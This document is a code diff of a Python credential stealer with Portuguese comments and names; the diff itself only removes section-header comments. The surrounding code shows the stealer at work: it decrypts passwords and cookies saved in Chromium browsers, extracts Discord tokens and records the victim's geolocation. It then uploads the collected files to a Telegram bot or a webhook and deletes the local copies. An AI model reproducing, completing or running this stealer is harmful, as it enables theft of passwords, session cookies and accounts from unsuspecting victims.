@@ -10,7 +10,6 @@ from requests import post
 import socket
 import requests 
 
-# ------------------- Configurações de Caminho -------------------
 
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
@@ -38,7 +37,6 @@ fileCookies = "cookies_" + os.getlogin() + ".txt"
 filePass = "senhas_" + os.getlogin() + ".txt"
 fileInfo = "info_" + os.getlogin() + ".txt"
 
-# ------------------- Perfis dos Navegadores -------------------
 
 for browser, path in list(browser_loc.items()):
     if os.path.exists(path + "\\User Data"):
@@ -46,7 +44,6 @@ for browser, path in list(browser_loc.items()):
             if profile.startswith("Profile") or profile == "Default":
                 browser_loc[f"{browser}_{profile}"] = f"{path}\\User Data\\{profile}"
 
-# ------------------- Tokens do Discord -------------------
 
 def decrypt_token(buff, master_key):
     try:
@@ -98,7 +95,6 @@ def get_tokens(path):
 
     return finalizado
 
-# ------------------- Funções para Descriptografar -------------------
 
 def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)
@@ -107,7 +103,6 @@ def generate_cipher(aes_key, iv):
 def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
 
-# ------------------- Descriptografar Dados do Navegador -------------------
 
 def decrypt_browser(LocalState, LoginData, CookiesFile, name):
     if os.path.exists(LocalState):
@@ -182,7 +177,6 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
         with open(fileInfo, "a") as f:
             f.write(f"{name} Arquivo Local State não encontrado\n")
 
-# ------------------- Funções Auxiliares de Caminho -------------------
 def Local_State(path):
     return f"{path}\\Local State"
 
@@ -192,7 +186,6 @@ def Login_Data(path):
 def Cookies(path):
     return f"{path}\\Network\\Cookies"
 
-# ------------------- Manipulação de Tokens -------------------
 def main_tokens():
     for plataforma, path in tokenPaths.items():
         if not os.path.exists(path):
@@ -214,7 +207,6 @@ def decrypt_files(path, browser):
         with open(fileInfo, "a") as f:
             f.write(browser + " não instalado\n")
 
-# ------------------- Envio para Webhook -------------------
 def post_to(file):
     token = "TOKEN DO TELEGRAM"
     chat_id = "ID DO CHAT DO TELEGRAM"
@@ -227,7 +219,6 @@ def post_to(file):
     if webhook_url != "URL DO WEBHOOK":
         post(webhook_url, files={'files': open(file, 'rb')})
 
-# ------------------- Manipulação de Arquivos -------------------
 for_handler = (fileInfo, filePass, fileCookies, "TempMan.db", "CookMe.db")
 
 def file_handler(file):
@@ -236,7 +227,6 @@ def file_handler(file):
             post_to(file)
         os.remove(file)
 
-# ------------------- Função para Capturar Geolocalização -------------------
 def capturar_geolocalizacao():
     try:
         # Obter o IP público
@@ -269,7 +259,6 @@ def capturar_geolocalizacao():
         with open(fileInfo, "a") as f:
             f.write(f"\nErro ao obter informações de geolocalização\n{str(e)}\n")
 
-# ------------------- Função Principal -------------------
 def main():
     # Capturar geolocalização antes de coletar outras informações
     capturar_geolocalizacao()
